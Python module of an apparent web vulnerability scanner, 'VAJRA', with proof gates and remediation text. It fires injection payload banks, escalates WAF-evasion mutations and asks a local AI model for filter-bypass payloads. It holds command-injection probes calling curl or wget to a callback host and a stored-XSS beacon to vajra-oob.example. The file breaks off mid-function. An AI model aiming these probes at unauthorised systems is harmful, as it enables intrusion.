"""VAJRA web vulnerability scanner — driven by the adaptive payload engine.
Every injection class runs the full payload bank; when a WAF interferes the
attacker escalates through fingerprint-specific mutation chains until the
motive is achieved or the arsenal for that class is exhausted.

Covers form fields, GET query params, JSON API bodies and XML bodies; each
transport gets the right encoding so XXE / JSON-injection / NoSQL surfaces
that a form-only scanner would try are actually probed."""
import json as _json
import re
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, parse_qsl, urlencode

from core.database import Finding
from core.http_client import build_multipart, raw_http
from core import proof as P
from core.payload_engine import (
    AdaptiveAttacker, BANKS, SQLI_BANK, TIME_SQLI,
    motive_reflect, motive_lfi, motive_rce,
    motive_ssti, motive_redirect, motive_header,
    classify_response, Verdict, UID_RE, SQL_ERR_RE)

XXE_MARK_RE = re.compile(r"root:x:|daemon:x:|bin:x:|uid=\d+\(root\)|"
                         r"\[extensions\]|ssh-dss|nsaIDS\b")
XXE_ERR_RE = re.compile(r"DOCTYPE|ENTITY|XML|well-formed|parser error|"
                        r"SAXParseException|DOMException|failed to open stream")
LDAP_ERR_RE = re.compile(r"malformed searchFilter|LDAP.*(error|exception)|"
                         r"BAD_FILTER|protocol error|Invalid filter|\bprovided to search")
XPATH_ERR_RE = re.compile(r"XPathException|XPath.*(error|exception)|"
                          r"javax\.xml|stacktrace|stack trace|not implemented by DOM")
REFLECT_MARKER = re.compile(r"vaJrFlAg|vjr-\d+")


class Point:
    def __init__(self, url, method, fields, origin, kind="form"):
        self.url = url
        self.method = method.upper()
        self.fields = fields or []
        self.origin = origin
        self.kind = kind


def send_point(engine, pt, param, value):
    data = {}
    for k, v in pt.fields:
        if k != param:
            data[k] = v
    data[param] = value
    if pt.kind in ("json", "xml"):
        base = pt.url.split("?")[0]
        try:
            asnum = int(value)
        except Exception:
            asnum = None
        if pt.kind == "json":
            body = {}
            for k, v in pt.fields:
                body[k] = v
            body[param] = value
            return engine.http.request(pt.method, base, json_body=body,
                                       allow_redirects=False)
        if isinstance(value, str) and value.lstrip().startswith("<?xml"):
            return engine.http.request(pt.method, base, data=value.encode(),
                                       headers={"Content-Type": "application/xml"},
                                       allow_redirects=False)
        inner = "".join("<%s>%s</%s>" % (k, v, k) for k, v in data.items())
        doc = ('<?xml version="1.0" encoding="UTF-8"?><vajra>%s</vajra>'
               % inner)
        return engine.http.request(pt.method, base, data=doc.encode(),
                                   headers={"Content-Type": "application/xml"},
                                   allow_redirects=False)
    if pt.method == "GET":
        return engine.http.get(pt.url.split("?")[0] + "?" + urlencode(data),
                               allow_redirects=False)
    return engine.http.post(pt.url, data=data, allow_redirects=False)


_SECRET_BUMP = "\x00"


def build_points(engine):
    """Every injection point the suite will attack.

    Coverage-first: the mandatory pass adds exactly one point per GET-query
    endpoint and one point per FORM (a form point carries ALL of that form's
    fields and the run loop attacks every field of it), so no form on any
    crawled endpoint can be silently dropped by the attack budget. The
    ``max_injection_points`` budget then only trims the *extra* API/query
    endpoints, never whole forms or form parameters."""
    pts, seen = [], set()
    limit = int(engine.cfg("max_injection_points", 60))
    mandatory = []
    for page in engine.state.get("pages", []):
        u = page["url"]
        parsed = urlparse(u)
        qs = parse_qsl(parsed.query)
        if qs:
            key = ("get", parsed.path)
            if key not in seen:
                seen.add(key)
                mandatory.append(Point(u, "GET", qs, page["url"], "form"))
        for f in page.get("forms", []):
            fields = [fd for fd in f.get("fields", [])
                      if fd["type"] in ("submit", "button")]
            if len(fields) == len(f.get("fields", [])):
                continue  # a form with ONLY button/submit inputs has nothing
            key = (f["method"], f["action"])
            if key in seen:
                continue
            seen.add(key)
            mandatory.append(Point(f["action"], f["method"],
                                   [(x["name"], x.get("value", ""))
                                    for x in f["fields"]],
                                   f.get("page") or page["url"], "form"))
    api = engine.state.get("api") or {}
    extras = []
    for ep in api.get("endpoints", []):
        meth = (ep.get("method") or "GET").upper()
        if meth in ("OPTIONS", "HEAD"):
            continue
        path = ep.get("path", "")
        url = ep.get("url") or (ep.get("base", "") + path)
        fields = []
        ct = (ep.get("ct") or "").lower()
        kind = "json" if "xml" not in ct else "xml"
        if meth == "GET":
            qs = parse_qsl(urlparse(url).query)
            for n, _v in qs:
                fields.append((n, _v))
        key = ("api", meth, path, kind)
        if key in seen:
            continue
        seen.add(key)
        extras.append(Point(url, meth, fields, "api:%s %s" % (meth, path),
                            kind))
    room = max(0, limit - len(mandatory))
    pts.extend(mandatory)
    pts.extend(extras[:room])
    if len(mandatory) > limit:
        engine.log.warn(
            "[vulnscan] %d endpoints+forms exceed the %d-point budget; "
            "coverage-first ordering still tests every form, only the "
            "API/query extras beyond the budget are trimmed" %
            (len(mandatory), limit))
    return pts


def ai_second_pass(engine, sender, motive, cls, waf, blocked_sample, context,
                   control=None):
    """When filters defeat the whole bank, consult the local Qwen3 AI.

    `control` is the benign-value response for the same request. It has to be
    passed through: an AI-suggested payload that fires the motive is held to
    the same standard as a bank payload, and without the control the result
    would claim `control_clean is None` and be suppressed downstream.
    """
    try:
        ai = getattr(engine, "ai", None)
    except Exception:
        return None
    if not ai or not ai.available():
        return None
    sugg = ai.suggest_payloads(cls, waf, blocked_sample, context)
    if not sugg:
        return None
    att = AdaptiveAttacker(sender, motive, waf=waf, max_direct=len(sugg),
                           max_mutants=0, control=control)
    res = att.run(sugg)
    engine._collect_evasion(att)
    if res.achieved and not res.technique.startswith("ai"):
        res.technique = "ai:" + res.technique
    return res


URL_PARAM_HINTS = ("url", "redirect", "next", "target", "dest", "goto",
                   "return", "continue", "link", "rurl", "returnto")
PATHY_HINTS = ("path", "file", "page", "include", "tpl", "doc", "dir",
               "lang", "template", "read", "view", "load", "src")
CMD_HINTS = ("cmd", "exec", "command", "ping", "host", "ip", "domain")
SEARCH_HINTS = ("search", "q", "query", "filter", "user", "login", "auth",
                "uid", "dn", "name", "email", "find", "lookup")
SSTI_HINTS = ("template", "view", "render", "name", "message", "greet",
              "page", "lang", "theme", "layout", "title")

SEV = {"xss": "high", "sqli": "critical", "sqli_time": "critical",
       "sqli_blind": "high", "lfi": "critical", "rce": "critical",
       "ssti": "critical", "redirect": "medium", "nosql": "critical",
       "crlf": "medium", "xxe": "critical", "ldap": "high",
       "xpath": "high", "hpp": "low", "hostinject": "medium",
       "stored_xss": "high", "rce_blind": "high", "ssrf_blind": "high"}
TITLES = {
    "xss": "Reflected Cross-Site Scripting (param '%s')",
    "sqli": "SQL Injection confirmed (param '%s')",
    "sqli_time": "Time-based Blind SQL Injection (param '%s')",
    "sqli_blind": "Boolean-based Blind SQL Injection (param '%s')",
    "lfi": "Local File Inclusion — system file read (param '%s')",
    "rce": "OS Command Injection — execution confirmed (param '%s')",
    "ssti": "Server-Side Template Injection → RCE surface (param '%s')",
    "redirect": "Open Redirect (param '%s')",
    "nosql": "NoSQL Operator Injection accepted (param '%s')",
    "crlf": "CRLF / HTTP Response Splitting (param '%s')",
    "xxe": "XML External Entity processing — local file read (param '%s')",
    "ldap": "LDAP Injection — filter manipulation (param '%s')",
    "xpath": "XPath Injection — query manipulation (param '%s')",
    "hpp": "HTTP Parameter Pollution — duplicate-param confusion (param '%s')",
    "hostinject": "Host Header Injection / web-cache poisoning surface",
    "stored_xss": "Stored Cross-Site Scripting — form deposit reflected (%s)",
    "rce_blind": "Blind OS Command Injection — OOB callback (param '%s')",
    "ssrf_blind": "Blind SSRF — OOB callback (param '%s')",
}
REM = {
    "xss": "Contextual output encoding + strict CSP.",
    "sqli": "Parameterized queries; least-privilege DB accounts.",
    "sqli_time": "Parameterized queries; query latency monitoring.",
    "sqli_blind": "Parameterized queries; differential timing/heuristics.",
    "lfi": "Allowlist identifiers; chroot/containment.",
    "rce": "Eliminate shell invocation with user input; sandbox.",
    "ssti": "Render input as data, never as template source.",
    "redirect": "Strict destination allowlist.",
    "nosql": "Input type enforcement; disable $where eval.",
    "crlf": "Reject CR/LF in header values.",
    "xxe": "Disable DTDs/external entities in XML parser.",
    "ldap": "Escape LDAP metacharacters; filter allowlists.",
    "xpath": "Parameterize XPath expressions; evaluate as data.",
    "hpp": "Bind to the same parameter the framework uses; reject dupes.",
    "hostinject": "Validate Host; ignore X-Forwarded-* from untrusted edges.",
    "stored_xss": "Contextual output encoding on storage + render paths.",
    "rce_blind": "Eliminate shell invocation with user input; sandbox.",
    "ssrf_blind": "Allowlist outbound hosts; abort on loopback/link-local.",
}


def run(engine):
    t = engine.target
    targets = engine.state.get("web_targets") or []
    if not targets:
        return
    waf = engine.state.get("waf") or None
    direct_cap = int(engine.cfg("max_payloads_direct", 60))
    mutant_cap = int(engine.cfg("max_mutants", 12))
    deep = bool(engine.cfg("deep", False)) or engine.profile in ("full", "deep")
    points = build_points(engine)
    tested = set()
    blocked_stats = {}
    class_hits = {}
    pt_total = max(1, len(points))
    pt_done = 0

    def record(cls, pt, k, res):
        """File a candidate through the proof gate.

        This is the single funnel for every injection class in this module, so
        the gate is applied once, here. What changed is what the module is
        asked for: it used to declare a confidence string and could name
        `firm` on a bare reflection, which the severity ladder let rise to
        high. Now it supplies the observation, and `core.proof` decides whether
        the finding exists and how confident it may be.

        A candidate whose proof does not validate is not written as a finding
        — it goes to the suppressed ledger with the reason, which is what the
        operator needs to see when a real issue is refused (an unstable blind
        SQLi, say) rather than a silent drop.
        """
        title = TITLES[cls] % k
        sev = SEV[cls]
        if cls == "xss" and getattr(res, "technique", "") == "direct":
            sev = "high"
        engine.record(
            t.display, "web.vulnscan", "web-vuln", sev, title,
            detail="Origin: %s\nMethod: %s (%s)\nParameter: %s\nWAF: %s\n"
                   "Technique: %s\nAttempts: %d (blocked: %d)" %
                   (pt.origin, pt.method, pt.kind, k, waf or "none detected",
                    res.technique, res.attempts, res.blocked),
            evidence=res.evidence[:3000], remediation=REM[cls],
            cls=cls, proof=_proof_for(cls, pt, k, res),
        )

    def _proof_for(cls, pt, k, res):
        """Rebuild the artifact that proves `cls`, from the response that
        produced the hit.

        The gate re-checks this against the class rule, so it must be the real
        observation rather than a restatement of the claim: `res.body` is the
        body that fired the motive, and `res.control_body` the benign-value
        control for the same request (`None` when no control was run, which the
        rule treats as unproven rather than clean).

        Some of these classes are still filed at `differential` strength, which
        caps them at high and requires a clean control. That is the honest
        ceiling for a body-size or error-signature change: it shows the input
        altered behaviour, not that it executed.
        """
        ctl = getattr(res, "control_body", None)
        body = getattr(res, "body", "") or ""
        cl = getattr(res, "control_clean", None)
        # Branch on the canonical class: this module spells several of them its
        # own way (`stored_xss`, `sqli_time`, `redirect`, `rce_blind`), and
        # matching only the literal spellings would send those to the generic
        # differential fallback, where the class rule rejects the proof kind
        # and every one of them is suppressed.
        canon = P.resolve_class(cls) or cls

        if canon == "xss":
            # Bare reflection is not XSS. This helper is the one that says so,
            # by requiring the payload to survive verbatim into a position a
            # browser would execute. For `stored_xss` the payload is the
            # deposited beacon.
            return P.xss_proof(body, getattr(res, "success", ""),
                               control_body=ctl)
        if canon == "lfi":
            return P.lfi_proof(body, control_body=ctl)
        if canon == "rce":
            return P.rce_proof(body, control_body=ctl)
        if cls == "rce_blind":
            # An OOB callback to a token minted for this scan. No control is
            # meaningful: nothing in a benign response can forge a per-scan
            # token, so the control is clean by construction and we say so
            # rather than pretending one was run.
            return P.callback(getattr(res, "evidence", "") or "",
                              note="out-of-band callback to a per-scan token")
        if canon == "sqli":
            return P.sqli_proof(body, control_body=ctl)
        if canon == "ssti":
            return P.ssti_proof(body, getattr(res, "expected", "") or "",
                                control_body=ctl)
        if canon == "sqli_blind":
            # The observation is a true/false pair diverging and then
            # reproducing, so `reproduced` carries this one. The probe measures
            # its own benign baseline and reports whether that baseline was
            # itself slow, so prefer that verdict over "a control existed".
            return P.differential(
                getattr(res, "evidence", "") or "",
                control_clean=(cl if cl is not None
                               else (True if ctl is not None else None)),
                reproduced=bool(getattr(res, "reproduced", False)),
                note="timing/boolean differential reproduced against a "
                     "benign baseline")
        if canon == "open_redirect":
            # The artifact has to be the destination actually observed, and the
            # control the destination a benign value produced — if the app
            # already redirects to the attacker host for a normal input, this
            # is not an open redirect. `control_location` is None only when no
            # control ran, which the rule treats as unproven.
            dest = getattr(res, "location", "") or \
                getattr(res, "dest", "") or ""
            ctl_dest = getattr(res, "control_location", None)
            return P.marker(
                "redirect destination: %s" % dest,
                control_clean=(None if ctl_dest is None
                               else "vajra-oob.example" not in ctl_dest.lower()))
        if canon == "crlf":
            return P.marker(
                "payload %s produced header X-Vajra-Probe in the response"
                % (getattr(res, "success", "") or ""),
                control_clean=getattr(res, "control_clean", None))
        if canon == "xxe":
            m = XXE_MARK_RE.search(body)
            return P.marker(
                m.group(0) if m else "",
                control_clean=_ctl_state_re(XXE_MARK_RE, ctl))
        # nosql / ldap / xpath / hpp: a behaviour change against the control.
        return P.differential(
            "%s\n%s" % (getattr(res, "evidence", "") or "",
                        _delta_note(ctl, body)),
            control_clean=cl if cl is not None else (True if ctl is not None
                                                     else None),
            note="response differed from the benign-value control")

    def _ctl_state(needle, ctl_body):
        """Tri-state control check: None when no control ran."""
        if ctl_body is None:
            return None
        return needle not in (ctl_body or "").lower()

    def _ctl_state_re(rx, ctl_body):
        if ctl_body is None:
            return None
        return not rx.search(ctl_body or "")

    def _delta_note(ctl_body, body):
        if ctl_body is None:
            return "no control response"
        return "len(control)=%d len(response)=%d" % (len(ctl_body), len(body))

    # Parallel, bounded injection. Each (point, field) is an independent
    # adaptive sequence (baseline + WAF-escalating payload bank), so fields can
    # be probed concurrently while each field's adaptive chain stays serial
    # (that preservation is what keeps false positives out). DB writes are
    # serialized by Database.lock and evasion capture by engine._collect_evasion
    # lock; cross-field dedup/structured state lives on this lock.
    ips = threading.Lock()

    def _attack_field(pt, k):
        # returns (pkey, hit_classes) — hit_classes is the per-point set of
        # classes already proven so other fields/points can skip redundant work.
        fields = [fd[0] for fd in pt.fields]
        pkey = (pt.url.split("?")[0], pt.method, k)

        def sender(payload, _pt=pt, _k=k):
            return send_point(engine, _pt, _k, payload)

        base_r = sender("vjrbase")
        bbody = getattr(base_r, "body", "")[:60000]
        blen, bstatus = len(bbody), base_r.status
        low_base = bbody.lower()
        origv = dict(pt.fields).get(k, "")
        # The negative control for every injection motive below: the same
        # request carrying a benign value, which is exactly what `base_r` is.
        # Using base_r rather than the parameter's own original value is
        # deliberate — the length-differential motives compare against `blen`,
        # and `blen` is base_r's length, so a control drawn from any other
        # input would show a legitimate size difference, fire the motive, and
        # refuse every candidate on the parameter.
        ctl_body = bbody
        # A parameter whose ORIGINAL value is echoed back by the app is a
        # reflected parameter: ANY payload into it changes response length, so
        # length-based differential motives below would false-positive. Same
        # guard the blind-SQLi differential already uses.
        reflects = False
        ov = str(origv)
        if len(ov) >= 2 and ov.lower() in low_base:
            reflects = True

        def not_blocked(r):
            v, _why = classify_response(r)
            return v != Verdict.BLOCKED

        hits = set()

        def wrecord(cls, p, kk, res):
            record(cls, p, kk, res)
            hits.add(cls)

        # ---- XSS ----
        # The motive is bare reflection, which is NOT XSS on its own — a
        # parameter echoed back HTML-escaped reflects every payload and fires
        # it. That is why the finding is filed under the `xss` proof rule,
        # which re-checks the captured body for the payload landing in an
        # executable context and refuses the candidate when it did not.
        att = AdaptiveAttacker(sender, motive_reflect, waf=waf,
                               max_direct=direct_cap,
                               max_mutants=mutant_cap, control=base_r)
        rx = att.run(BANKS["xss"])
        engine._collect_evasion(att)
        if not rx.achieved and att.blocked >= 2:
            rx = ai_second_pass(engine, sender, motive_reflect, "XSS",
                                waf, att.evasion_log[-1]["original"]
                                if att.evasion_log else "", pt.origin,
                                control=base_r) or rx
        if rx.achieved:
            wrecord("xss", pt, k, rx)

        cmd_param = any(h in k.lower() for h in CMD_HINTS)
        # snapshot of cross-field dedup state (may miss concurrent in-flight
        # additions; conservative, only ever causes a tiny bit of redundant work)
        with ips:
            class_hits_snap = {kk: set(v) for kk, v in class_hits.items()}

        # ---- SQLi (error) ----
        def sqli_motive(p, r):
            return not_blocked(r) and \
                bool(SQL_ERR_RE.search(getattr(r, "body", "")[:60000]))

        att = AdaptiveAttacker(sender, sqli_motive, waf=waf,
                               max_direct=direct_cap,
                               max_mutants=mutant_cap, control=base_r)
        rs = att.run(SQLI_BANK)
        engine._collect_evasion(att)
        if not rs.achieved and att.blocked >= 2:
            rs = ai_second_pass(engine, sender, sqli_motive, "SQLi",
                                waf, att.evasion_log[-1]["original"]
                                if att.evasion_log else "", pt.origin,
                                control=base_r) or rs
        if rs.achieved:
            wrecord("sqli", pt, k, rs)

        # ---- SQLi (boolean-blind differential) ----
        ch = class_hits_snap.get(pkey, set())
        if not (rs.achieved or ch) and deep and \
                not REFLECT_MARKER.search(bbody) and \
                len(str(origv)) <= 80:
            bolt = _blind_sqli(engine, sender, k, origv, base_r,
                               bstatus, blen)
            if bolt:
                wrecord("sqli_blind", pt, k, bolt)

        # ---- LFI ----
        pathy = "rce" not in ch
        if pathy and any(h in k.lower() for h in
                         PATHY_HINTS + ("name", "id", "file", "page")):
            att = AdaptiveAttacker(sender, motive_lfi, waf=waf,
                                   max_direct=direct_cap,
                                   max_mutants=mutant_cap, control=base_r)
            rl = att.run(BANKS["lfi"])
            engine._collect_evasion(att)
            if not rl.achieved and att.blocked >= 2:
                rl = ai_second_pass(engine, sender, motive_lfi, "LFI",
                                    waf, att.evasion_log[-1]["original"]
                                    if att.evasion_log else "",
                                    pt.origin, control=base_r) or rl
            if rl.achieved:
                wrecord("lfi", pt, k, rl)

        # ---- RCE (reflected echo) ----
        if cmd_param or len(fields) <= 3:
            att = AdaptiveAttacker(sender, motive_rce, waf=waf,
                                   max_direct=min(direct_cap, 120),
                                   max_mutants=mutant_cap, control=base_r)
            rr = att.run(BANKS["rce"])
            engine._collect_evasion(att)
            if not rr.achieved and att.blocked >= 2:
                rr = ai_second_pass(engine, sender, motive_rce, "RCE",
                                    waf, att.evasion_log[-1]["original"]
                                    if att.evasion_log else "",
                                    pt.origin, control=base_r) or rr
            if rr.achieved:
                wrecord("rce", pt, k, rr)

        # ---- blind RCE via OOB (aggressive/interactive) ----
        oob = getattr(engine, "oob", None)
        if oob and rr is not None and not rr.achieved and \
                (cmd_param or len(fields) <= 3):
            br = _blind_rce_oob(engine, sender, pt, k, oob)
            if br:
                wrecord("rce_blind", pt, k, br)

        # ---- SSTI ----
        if any(h in k.lower() for h in SSTI_HINTS):
            for marker_expr, marker_val in (("{{7*'7'}}", "7777777"),
                                            ("{{7*7}}", "49")):
                if marker_val in low_base:
                    continue
                att = AdaptiveAttacker(sender, motive_ssti(marker_val),
                                       waf=waf, max_direct=6,
                                       max_mutants=mutant_cap, control=base_r)
                rst = att.run([marker_expr])
                engine._collect_evasion(att)
                if rst.achieved:
                    wrecord("ssti", pt, k, rst)
                    # escalate with the full engine-agnostic SSTI_RCE bank
                    att2 = AdaptiveAttacker(sender, motive_ssti_diff(blen),
                                            waf=waf,
                                            max_direct=min(direct_cap, 60),
                                            max_mutants=mutant_cap,
                                            control=base_r)
                    rese = att2.run(BANKS["ssti"])
                    engine._collect_evasion(att2)
                    if rese.achieved:
                        rese.technique = "ssti:" + rese.technique
                        wrecord("ssti", pt, k, rese)
                    break

        # ---- Open redirect ----
        if any(h in k.lower() for h in URL_PARAM_HINTS):
            att = AdaptiveAttacker(sender,
                                   motive_redirect("vajra-oob.example"),
                                   waf=waf, max_direct=25,
                                   max_mutants=mutant_cap, control=base_r)
            rd = att.run(BANKS["redirect"])
            engine._collect_evasion(att)
            if rd.achieved:
                wrecord("redirect", pt, k, rd)

        # ---- NoSQL ----
        if any(h in k.lower() for h in ("user", "login", "pass", "email",
                                        "auth")):
            def nosql_motive(p, r):
                body = getattr(r, "body", "")
                if reflects:
                    return False
                return r.status != bstatus and 200 <= r.status < 400 or \
                    (abs(len(body) - blen) > max(60, int(blen * 0.06)))
            att = AdaptiveAttacker(sender, nosql_motive, waf=waf,
                                   max_direct=14, max_mutants=6,
                                   control=base_r)
            rn = att.run(BANKS["nosql"])
            engine._collect_evasion(att)
            if rn.achieved:
                wrecord("nosql", pt, k, rn)

        # ---- LDAP / XPath ----
        if any(h in k.lower() for h in ("user", "login", "auth", "uid",
                                        "dn", "filter", "search", "name",
                                        "email")):
            for cls, bank, emark in (("ldap", "ldap", LDAP_ERR_RE),
                                     ("xpath", "xpath", XPATH_ERR_RE)):
                def diff_motive(p, r):
                    if not_blocked(r) and \
                            bool(emark.search(r.body[:60000])):
                        return True
                    if reflects:
                        return False
                    return not_blocked(r) and \
                        abs(len(r.body) - blen) > \
                        max(90, int(blen * 0.1))
                att = AdaptiveAttacker(sender, diff_motive, waf=waf,
                                       max_direct=12, max_mutants=4,
                                       control=base_r)
                rd = att.run(BANKS[cls])
                engine._collect_evasion(att)
                if rd.achieved:
                    wrecord(cls, pt, k, rd)

        # ---- HPP (duplicate-param) ----
        if pt.kind in ("form", "json") and \
                "submit" not in k.lower():
            _hpp_test(engine, pt, k, sender, bstatus, blen, record)

        # ---- CRLF ----
        crlf_probe = "vjr%0d%0aX-Vajra-Probe: 1"
        rc_ = sender(crlf_probe)
        if "x-vajra-probe" in {h.lower() for h in rc_.headers}:
            att_fake = AdaptiveAttacker(sender, motive_header("x-vajra-probe"),
                                        waf=waf, max_direct=1,
                                        max_mutants=4, control=base_r)
            rcx = att_fake.run([crlf_probe])
            engine._collect_evasion(att_fake)
            if rcx.achieved:
                wrecord("crlf", pt, k, rcx)

        # ---- time-based blind SQLi (deep profiles) ----
        # One slow response is not a finding: a cold cache, a GC pause or a
        # busy neighbour all produce one. This measures the parameter's own
        # baseline latency, requires the delay to clear it, and then reproduces
        # it — the `sqli_blind` rule demands a clean control *and* a
        # reproduction, and a lone five-second response has neither. Getting
        # that wrong is what puts a timing blip in a report as "critical".
        _ov = str(origv)
        if deep and ((len(_ov) <= 40 and not _ov.isdigit()) or
                     re.match(r"^\d+$|^[a-z_]+$", _ov)):
            t0 = time.time()
            try:
                sender(_ov)
                base_took = time.time() - t0
            except Exception:
                base_took = -1.0
            for tp in TIME_SQLI[:5]:
                t0 = time.time()
                rt = sender(_ov + " " + tp)
                took = time.time() - t0
                if took < 5.0 or rt.status != bstatus:
                    continue
                t0 = time.time()
                try:
                    rt2 = sender(_ov + " " + tp)
                except Exception:
                    continue
                took2 = time.time() - t0
                if took2 < 5.0:
                    continue
                # The control is the benign request: it must not itself have
                # been slow, or the delay is the target's, not the payload's.
                fake_res = _mk_result(
                    tp, "delay %.1fs then %.1fs (benign baseline %.1fs)" %
                    (took, took2, base_took),
                    body=getattr(rt2, "body", "")[:60000],
                    control_body=bbody,
                    control_clean=(base_took >= 0.0 and base_took < 5.0),
                    reproduced=True)
                wrecord("sqli_time", pt, k, fake_res)
                break
        return pkey, hits

    # Build the unique work list (dedup by url+method+field) then dispatch it
    # across a bounded worker pool, one field at a time.
    jobs = []
    for pt in points:
        if pt.kind == "xml":
            continue  # handled serially below, whole-body XXE needs its own pass
        fields = [fd[0] for fd in pt.fields] or ["id"]
        for k in fields:
            pkey = (pt.url.split("?")[0], pt.method, k)
            if pkey in tested:
                continue
            tested.add(pkey)
            jobs.append((pt, k))
    pt_total = max(1, len(jobs) + sum(1 for p in points if p.kind == "xml"))
    pt_done = 0

    if jobs:
        # A generous worker ceiling for the I/O-bound HTTP brute; saturates the
        # adapter without spawning thousands of threads.
        inj_threads = min(120, max(8, int(engine.cfg("inject_threads", 24))))
        if bool(getattr(engine.args, "aggressive", False)) and \
                not bool(getattr(engine.args, "stealth", False)):
            inj_threads = min(240, max(16, inj_threads * 6))
        with ThreadPoolExecutor(max_workers=inj_threads) as ex:
            futs = {ex.submit(_attack_field, pt, k): (pt, k)
                    for pt, k in jobs}
            for af in as_completed(futs):
                pt, k = futs[af]
                pt_done += 1
                try:
                    pkey, hits = af.result()
                except Exception:
                    pkey, hits = None, set()
                if hits:
                    with ips:
                        class_hits.setdefault(pkey, set()).update(hits)
                engine.progress(min(pt_done, pt_total), pt_total,
                                detail="inject %d/%d" %
                                       (min(pt_done, pt_total), pt_total))
    # XML endpoints: whole-body XXE probe, sequence not parallelisable
    for pt in points:
        if pt.kind == "xml":
            pt_done += 1
            engine.progress(min(pt_done, pt_total), pt_total,
                            detail="inject %d/%d" %
                                   (min(pt_done, pt_total), pt_total))
            _run_xml_class(engine, pt, t, targets, waf, direct_cap,
                           mutant_cap, record)
    _check_methods(engine, targets)
    if deep:
        _stored_pass(engine, points, targets, waf, record)
    _check_host_header(engine, targets)
    engine.state.setdefault("blocked_stats", blocked_stats)


def _sst_math_motive_wrap(blen):
    return motive_ssti_diff(blen)


def motive_ssti_diff(blen):
    def m(p, r):
        body = getattr(r, "body", "")
        return abs(len(body) - blen) > max(120, int(blen * 0.12))
    return m


def _run_xml_class(engine, pt, t, targets, waf, direct_cap, mutant_cap, record):
    """Whole-body XXE probing for XML endpoints: the bank members are complete
    XML documents, each replaces the request body wholesale."""
    def sender(payload):
        return engine.http.request(pt.method, pt.url.split("?")[0],
                                   data=payload.encode() if isinstance(payload, str)
                                   else payload,
                                   headers={"Content-Type": "application/xml"},
                                   allow_redirects=False)
    base_r = sender("<vajra/>")
    bstatus, blen = base_r.status, len(getattr(base_r, "body", ""))

    def xxe_motive(p, r):
        body = getattr(r, "body", "")[:60000]
        if not XXE_MARK_RE.search(body):
            return False
        same = r.status == bstatus
        return same or r.status in (200, 500)

    att = AdaptiveAttacker(sender, xxe_motive, waf=waf,
                           max_direct=min(direct_cap, len(BANKS["xxe"])),
                           max_mutants=mutant_cap, control=base_r)
    rx = att.run(BANKS["xxe"])
    engine._collect_evasion(att)
    if rx.achieved:
        record("xxe", pt, "XML_BODY", rx)
    engine.state.setdefault("xml_probed", True)


def _blind_sqli(engine, sender, k, origv, base_r, bstatus, blen):
    """Two-round true/false differential. Skips params that reflect their own
    raw value (would false-positive on payload length)."""
    low_base = getattr(base_r, "body", "").lower()
    if str(origv) in low_base:
        return None
    pairs = [
        ("' AND '1'='1'-- -", "' AND '1'='2'-- -"),
        ('" AND "1"="1"-- -', '" AND "1"="2"-- -'),
        (" AND 1=1-- -", " AND 1=2-- -"),
    ]
    for ta, fb in pairs:
        try:
            ra = sender(str(origv) + ta)
            rb = sender(str(origv) + fb)
        except Exception:
            continue
        la, lb = len(ra.body), len(rb.body)
        if not (200 <= ra.status < 400 and 200 <= rb.status < 400):
            continue
        if la == lb:
            continue
        span = max(la, lb)
        if abs(la - lb) < max(6, int(span * 0.015)):
            continue
        ra2 = sender(str(origv) + ta)
        if abs(len(ra2.body) - la) > max(4, int(span * 0.004)):
            continue
        return _mk_result("%s%s%s" % (origv, ta, ""),
                          "A:len=%d B:len=%d (stable)" % (la, lb),
                          body=getattr(ra2, "body", "")[:60000],
                          control_body=getattr(base_r, "body", "")[:60000],
                          control_clean=True, reproduced=True)
    return None


def _hpp_test(engine, pt, k, sender, bstatus, blen, record):
    """Duplicate-parameter pollution, tested against a single-value control.

    The marker is random, so counting its echoes only establishes that the
    server echoed a value it was sent — not that the duplicate changed
    anything. What makes this pollution is that sending the parameter twice
    produces more echoes than sending it once, so the control is the same
    request carrying a single value, and the candidate is refused unless the
    duplicate genuinely moved the count.
    """
    marker = "vjr-hpp-%d" % (time.time() % 10000)

    def send(times):
        if pt.kind == "json":
            return engine.http.request(pt.method, pt.url.split("?")[0],
                                       json_body={k: [marker] * times},
                                       allow_redirects=False)
        dup = "&".join(["%s=%s" % (k, marker)] * times)
        url = pt.url
        if pt.method == "GET":
            sep = "&" if "?" in url else "?"
            return engine.http.get(url + sep + dup, allow_redirects=False)
        data = dict(pt.fields)
        body = "&".join("%s=%s" % (n, v) for n, v in data.items()) + \
            "&" + dup
        return engine.http.request(
            "POST", url, data=body.encode(),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            allow_redirects=False)

    try:
        res = send(2)
        one = send(1)
    except Exception:
        return
    body = getattr(res, "body", "")
    ctl_body = getattr(one, "body", "")
    n_dup, n_one = body.count(marker), ctl_body.count(marker)
    if res.status == bstatus and n_dup >= 2 and n_dup > n_one:
        record("hpp", pt, k, _mk_result(
            marker, "duplicated parameter echoed %d times vs %d for a single "
            "value" % (n_dup, n_one),
            body=body[:60000], control_body=ctl_body, control_clean=True))


def _blind_rce_oob(engine, sender, pt, k, oob):
    token = oob.token
    cb = oob.url("rce", host=None)
    progs = [("curl", "%s -s" % cb), ("wget", "-q %s -O /dev/null" % cb),
             ("nslookup", "%s" % cb), ("ping", "-c1 -W1 %s" % cb)]
    bench = [("; %s; true" % c, "& %s &" % c, "| %s #" % c, "`%s`" % c,
              "$(%s)" % c) for c, _ in progs]
    # build limited set: few well-known separators x callback hosts
    sep_tmpl = [";%s #", "|%s #", "&&%s", "%0a%s%0a", "`%s`", "$(%s)"]
    probes = []
    for c, args in progs:
        cmd = "%s %s" % (c, args.replace("<oob>", cb)) if "<oob>" in args \
            else "%s %s" % (c, args)
        for st in sep_tmpl:
            probes.append(st % cmd)
    before = len(oob.hits())
    for p in probes[:24]:
        try:
            sender(p)
        except Exception:
            continue
    time.sleep(0.8)
    new = [h for h in oob.hits() if h["path"].startswith("/rce/")]
    if new:
        return _mk_result(probes[0], "OOB callback: %s" % new[-1]["path"])
    return None


def _stored_pass(engine, points, targets, waf, record):
    """Deposit an XSS beacon into non-login submit forms, then re-fetch crawl
    pages looking for the stored echo."""
    bead = 'vjr740<script>document.body.appendChild(document.createElement(' \
           '"img")).src="//vajra-oob.example/x/"</script>'
    targets_by_url = {t["url"]: t for t in targets}
    for pt in points:
        if pt.kind != "form" or pt.method != "POST":
            continue
        has_pass = any(n in ("password", "pass", "pwd") for n, _ in pt.fields)
        if has_pass:
            continue
        addr = pt.url.split("?")[0]
        data = dict(pt.fields)
        fill = 0
        for n, v in list(data.items()):
            if n in ("submit", "button"):
